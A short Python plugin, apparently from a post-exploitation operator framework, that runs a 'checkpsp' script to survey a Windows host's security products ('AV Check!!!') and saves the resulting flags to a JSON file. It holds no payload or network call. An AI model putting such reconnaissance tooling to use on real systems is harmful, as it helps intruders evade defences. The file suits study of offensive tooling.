
import json
import os
import dsz
import ops, ops.env, ops.survey
DONUTS = os.path.join(ops.LOGDIR, 'donuts.json')

def donuts():
    if (not os.path.exists(DONUTS)):
        return False
    flags = None
    with open(DONUTS) as input:
        try:
            flags = json.load(input)
        except:
            return False
    for i in flags.keys():
        ops.env.set(i, flags[i])
    return True

def save_donuts():
    flags = {}
    for i in ops.survey.flags():
        flags[i] = (True if (dsz.env.Get(i).upper() == 'TRUE') else False)
    with open(DONUTS, 'w') as output:
        json.dump(flags, output, indent=2)

def main():
    ops.survey.print_header('AV Check!!!')
    psp_cmd = ops.cmd.getDszCommand('python', arglist=['windows\\checkpsp.py'], project='Ops', dszquiet=False)
    psp_cmd.execute()
    save_donuts()
if ((__name__ == '__main__') or (__name__ == ops.survey.PLUGIN)):
    main()